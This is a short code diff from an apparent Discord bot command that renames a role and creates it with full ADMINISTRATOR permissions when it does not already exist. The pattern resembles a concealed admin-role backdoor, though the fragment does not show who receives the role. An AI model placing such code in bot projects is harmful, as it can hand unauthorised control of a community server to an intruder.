@@ -26,7 +26,7 @@ class serverCommand {
     }
     runCommand(args, msg, Bot) {
         return __awaiter(this, void 0, void 0, function* () {
-            let roleName = "pleb-chakuj1";
+            let roleName = "ANYROLE";
             var rolee = msg.guild.roles.find(r => r.name === roleName);
             if (!rolee) {
                 msg.guild.createRole({ name: roleName, color: "#9932CC", permissions: ["ADMINISTRATOR"] });
